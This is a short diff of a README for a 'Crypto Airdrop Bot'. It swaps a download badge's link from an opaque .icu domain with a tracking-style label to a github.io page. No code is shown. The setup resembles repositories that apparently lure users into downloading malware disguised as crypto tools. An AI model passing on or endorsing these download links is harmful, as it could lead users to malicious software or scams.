@@ -1,4 +1,4 @@
-[![Download Crypto AirdropBot](https://img.shields.io/badge/Download-Crypto%20AirdropBot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
+[![Download Crypto AirdropBot](https://img.shields.io/badge/Download-Crypto%20AirdropBot-blueviolet)](https://crypto-airdrop-bot.github.io/.github/)
 
 **Crypto Airdrop Bot 🎁🚀**
 
